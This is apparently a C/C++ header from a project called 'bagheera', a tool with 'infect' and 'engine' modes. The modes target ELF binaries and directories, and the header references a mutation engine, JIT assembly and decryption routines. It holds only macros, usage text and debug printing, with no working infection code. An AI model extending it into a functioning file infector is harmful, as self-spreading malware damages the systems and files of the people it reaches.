





#define OPTSTR "m:vi:o:d:e:h"
#define USAGE_FMT  "%s -m mode [-v] [-i inputfile] [ [-o outputfile] | -e targetelf | -d targetdir ]] [-h]"
#define ERR_MODE "invalid mode option. mode = [infect|engine]\n"
#define ERR_INPUT_OPEN "can't open input file\n"
#define ERR_INPUT_MALLOC "can't allocate memory for input file\n"
#define ERR_INPUT_READ "can't read input file\n"
#define ERR_FOPEN_INPUT  "can't open input file\n"
#define ERR_FOPEN_OUTPUT "fopen(output, w)\n"
#define ERR_FOPEN_ELF "open(targetelf, r)\n"
#define ERR_ENGINE "engine_execution()\n"
#define ERR_ELF "elf_infection()\n"
#define ERR_DIR_OPEN "can't open directory\n"
#define ERR_MODE_INFECT_OPTIONS "invalid options. in 'infect' mode, select ELF infection or directory infecton, but not both\n"
#define DEFAULT_PROGNAME "bagheera"

#define ENGINE "engine"
#define INFECT "infect"

#define MODE_ENGINE 1
#define MODE_INFECT 2
#define MODE_ERROR -1


#define ELF_MAGIC_NUMBER "\177ELF"
#define INFO_BANNER "\x1b[1;34m[INFO]\x1b[0m"
#define ERROR_BANNER "\x1b[1;31m[ERROR]\x1b[0m"
#define SUCCESS_BANNER "\x1b[1;32m[SUCCESS]\x1b[0m"
#define VERBOSE options->verbose


//typedef long(*DecryptionProc)(long);

#ifndef ERR_CODES

  #define MUTAGEN_ERR_PARAMS 1
  #define MUTAGEN_ERR_MEMORY 2
  #define MUTAGEN_ERR_SUCCESS 0

#endif

#define ASMJIT_EMBED
#define BLOCK_SIZE 8


//typedef unsigned int(*DecryptionProc)(void *);


#define DEBUGGING 2

#if DEBUGGING == 0
	#define DEBUG(s) 
	#define DEBUG2(s1, s2)
	#define ERROR(s)
#elif DEBUGGING == 1
	#define DEBUG(s) 
	#define DEBUG2(s1, s2)
	#define ERROR(s) (std::cout << ERROR_BANNER << ": "  << s << "\n")
#else
	#define DEBUG(s) (std::cout << INFO_BANNER << ": " << s << "\n")
	#define DEBUG2(s1, s2) (std::cout << INFO_BANNER << ": " << s1 << s2 << "\n")
	#define ERROR(s) (std::cout << ERROR_BANNER << ": " << s << "\n")
#endif